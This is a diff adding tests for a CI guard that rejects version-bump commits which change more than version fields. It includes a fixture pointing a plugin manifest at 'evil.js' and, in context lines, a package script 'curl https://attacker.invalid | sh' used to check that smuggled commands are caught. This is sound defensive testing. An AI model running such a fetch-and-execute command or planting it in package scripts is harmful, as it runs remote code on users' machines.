@@ -479,6 +479,70 @@ describe('check-version-child (parent CI inheritance)', () => {
     expect(result.exitCode).toBe(3);
   });
 
+  // version.yml bumps a plugin version file only while it exists (wish
+  // `retire-orca-integration`), so both plugin files are optional members.
+  test('accepts a version-only child that omits the plugin package manifest', () => {
+    const fixture = versionRepo();
+    git(fixture.root, 'checkout', '-q', '--detach', fixture.parent);
+    writeVersionTree(fixture.root, '6.260714.2');
+    git(fixture.root, 'checkout', '-q', fixture.parent, '--', 'plugins/genie/package.json');
+    git(fixture.root, 'add', '.');
+    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 6.260714.2 [auto-version]');
+    const child = git(fixture.root, 'rev-parse', 'HEAD');
+
+    const result = guard('check-version-child', {}, [fixture.parent, child, '6.260714.2'], fixture.root);
+    expect(result.exitCode).toBe(0);
+  });
+
+  test('accepts a package.json-only child when the plugin version files are absent', () => {
+    const root = mkroot('genie-version-child-noplugin-');
+    git(root, 'init', '-q');
+    git(root, 'config', 'user.name', 'fixture');
+    git(root, 'config', 'user.email', 'fixture@example.invalid');
+    writeVersionTree(root, '6.260714.1');
+    rmSync(join(root, 'plugins'), { recursive: true });
+    git(root, 'add', '.');
+    git(root, 'commit', '-qm', 'parent');
+    const parent = git(root, 'rev-parse', 'HEAD');
+    writeVersionTree(root, '6.260714.2');
+    rmSync(join(root, 'plugins'), { recursive: true });
+    git(root, 'add', '.');
+    git(root, 'commit', '-qm', 'chore(version): bump to 6.260714.2 [auto-version]');
+    const child = git(root, 'rev-parse', 'HEAD');
+
+    const result = guard('check-version-child', {}, [parent, child, '6.260714.2'], root);
+    expect(result.exitCode).toBe(0);
+  });
+
+  test('still rejects a child whose plugin package manifest change is not version-only', () => {
+    const fixture = versionRepo();
+    git(fixture.root, 'checkout', '-q', '--detach', fixture.parent);
+    writeVersionTree(fixture.root, '6.260714.2');
+    writeFileSync(
+      join(fixture.root, 'plugins/genie/package.json'),
+      `${JSON.stringify({ name: 'genie-plugin', version: '6.260714.2', main: 'evil.js' }, null, 2)}\n`,
+    );
+    git(fixture.root, 'add', '.');
+    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 6.260714.2 [auto-version]');
+    const child = git(fixture.root, 'rev-parse', 'HEAD');
+
+    const result = guard('check-version-child', {}, [fixture.parent, child, '6.260714.2'], fixture.root);
+    expect(result.exitCode).toBe(3);
+  });
+
+  test('rejects a child that deletes a plugin version file', () => {
+    const fixture = versionRepo();
+    git(fixture.root, 'checkout', '-q', '--detach', fixture.parent);
+    writeVersionTree(fixture.root, '6.260714.2');
+    rmSync(join(fixture.root, 'plugins/genie/package.json'));
+    git(fixture.root, 'add', '-A');
+    git(fixture.root, 'commit', '-qm', 'chore(version): bump to 6.260714.2 [auto-version]');
+    const child = git(fixture.root, 'rev-parse', 'HEAD');
+
+    const result = guard('check-version-child', {}, [fixture.parent, child, '6.260714.2'], fixture.root);
+    expect(result.exitCode).toBe(3);
+  });
+
   test('rejects a package script smuggled inside an otherwise allowlisted version file', () => {
     const fixture = versionRepo('curl https://attacker.invalid | sh');
     const result = guard('check-version-child', {}, [fixture.parent, fixture.child, '6.260714.2'], fixture.root);
